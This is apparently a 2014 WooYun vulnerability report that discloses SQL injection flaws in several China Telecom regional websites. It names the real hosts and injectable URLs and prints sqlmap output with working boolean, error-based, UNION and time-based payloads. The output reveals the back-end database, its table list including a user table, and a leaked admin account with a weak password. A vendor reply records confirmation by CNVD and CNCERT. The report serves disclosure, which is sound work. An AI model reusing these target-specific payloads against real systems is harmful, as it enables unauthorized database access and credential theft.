wybug_title: 中国电信多个分站点存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-03-17：	细节已通知厂商并且等待厂商处理中									2014-03-24：	厂商已经确认，细节仅向厂商公开									2014-04-03：	细节向核心白帽子及相关领域专家公开									2014-04-13：	细节向普通白帽子公开									2014-04-23：	细节向实习白帽子公开									2014-05-01：	细节向公众公开  简要描述： 电信注入 详细说明：  #站点list：http://www.hbitsx.com.cnhttp://www.ks.js.cnhttp://yz3g.mobi#注入点list：1.IT时讯电子报

http://www.hbitsx.com.cn/ImageContent.aspx?BlockTypeID=1&IsFirstPage=1http://www.hbitsx.com.cn/MoreContentList.aspx?QNum=20140125http://www.hbitsx.com.cn/forum.aspx?QNum=20140125&BlockTypeID=1&IsFirstPage=12.昆山视窗

http://food.ks.js.cn/sj_show.aspx?id=1041http://food.ks.js.cn/web_1/default.aspx?id=1041http://food.ks.js.cn/ztshow.aspx?id=61http://food.ks.js.cn/wbshow.aspx?id=1427&keepThis=true&TB_iframe=true&height=350&width=4003.扬州天翼

POST注入 
http://yz3g.mobi/flow/ pn=88952634
    漏洞证明：  IT时讯电子报
Place: GETParameter: IsFirstPage    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: BlockTypeID=1&IsFirstPage=1 AND 2873=2873    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: BlockTypeID=1&IsFirstPage=1 AND 9251=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(118)+CHAR(97)+CHAR(113)+(SELECT (CASE WHEN (9251=9251) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(120)+CHAR(113)))    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: BlockTypeID=1&IsFirstPage=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(118)+CHAR(97)+CHAR(113)+CHAR(109)+CHAR(89)+CHAR(79)+CHAR(106)+CHAR(82)+CHAR(87)+CHAR(80)+CHAR(77)+CHAR(78)+CHAR(107)+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL--     Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: BlockTypeID=1&IsFirstPage=-2846 OR 5101=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: BlockTypeID=1&IsFirstPage=(SELECT CHAR(113)+CHAR(120)+CHAR(118)+CHAR(97)+CHAR(113)+(SELECT (CASE WHEN (3340=3340) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(99)+CHAR(120)+CHAR(113))---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005current database:    'ENews'
tb:泄露管理员账户，弱口令
Database: ENews[6 tables]+--------------+| T_BlockInfo  || T_BlockType  || T_News       || T_PaperInfo  || T_User       || dtproperties |+--------------+
昆山视窗
Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1041 AND 1018=1018---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008current database:    'ksfood'

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-03-24 22:20 厂商回复： CNVD确认并复现所述多个案例情况，已经转由CNCERT直接通报中国电信集团公司，由其后续分别下发给对应省公司处置。按多个漏洞进行评分，rank 17 最新状态： 暂无
